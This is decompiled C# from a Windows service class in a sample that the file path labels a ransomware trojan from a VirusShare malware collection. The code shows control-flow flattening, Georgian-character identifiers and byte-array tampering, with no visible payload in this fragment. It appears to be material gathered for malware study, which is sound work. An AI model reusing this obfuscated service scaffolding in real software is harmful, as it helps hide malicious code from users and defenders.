// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႥႥ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

namespace Ⴃ
{
  internal sealed class ႥႥ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴀ = new ႤႳ.Ⴄ();

    public ႥႥ() => this.Ⴍ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static ႳႣ.ႣႷ Ⴃ()
    {
      ႳႣ.ႣႷ ⴈ = ႣႳ.Ⴈ;
      ႣႣ.Ⴍ[101] = (byte) ((int) ႣႣ.Ⴍ[101] - (int) ႣႣ.Ⴍ[34] & 65);
      return ⴈ;
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 2:
            goto label_5;
          case 3:
          case 5:
            num = this.Ⴀ.Ⴄ == null ? (int) ⴗ[153] - 36921 : 6;
            continue;
          case 6:
            goto label_4;
          default:
            num = !obj0 ? (int) ⴐ[402] - 136 : (int) ⴍ[39] / 5;
            continue;
        }
      }
label_4:
      this.Ⴀ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴍ()
    {
      this.Ⴀ.Ⴄ = (IDisposable) new Container() as IContainer;
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႷႤ), 4L, 0, 1951761525), (short) 355, 'ċ');
      ႣႣ.Ⴍ[80] = (byte) ((int) ႣႣ.Ⴍ[80] * (int) ႣႣ.Ⴍ[3] & 46);
    }

    static ႥႥ() => ႳႣ.Ⴅ();

    internal static Encoding Ⴅ([In] char obj0, [In] char obj1)
    {
      char[] ⴗ = ႷႼ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[111] - 32753;
      ICloneable cloneable;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_12;
          case 1:
            cloneable = (ICloneable) null;
            num2 = (int) ⴗ[131] - 34579;
            continue;
          case 2:
            num2 = 3;
            continue;
          case 3:
            int num4;
            switch (((int) obj0 ^ (int) obj1) - 9 ^ num1)
            {
              case 0:
                num4 = 5;
                break;
              default:
                num4 = 1;
                break;
            }
            num2 = num4;
            continue;
          case 4:
          case 5:
          case 7:
            cloneable = (ICloneable) Encoding.UTF8;
            num2 = 9;
            continue;
          case 8:
            num2 = num3 % 2 != 0 ? 3 : (int) ⴗ[89] - (int) ⴗ[89];
            continue;
          case 9:
            ++num1;
            int num5 = (int) obj1;
            int num6 = num5 * num5;
            num3 = (int) obj1 + num6;
            num2 = 8;
            continue;
          case 10:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႥ.Ⴅ);
            num2 = 10;
            continue;
        }
      }
label_12:
      return (Encoding) cloneable;
    }
  }
}
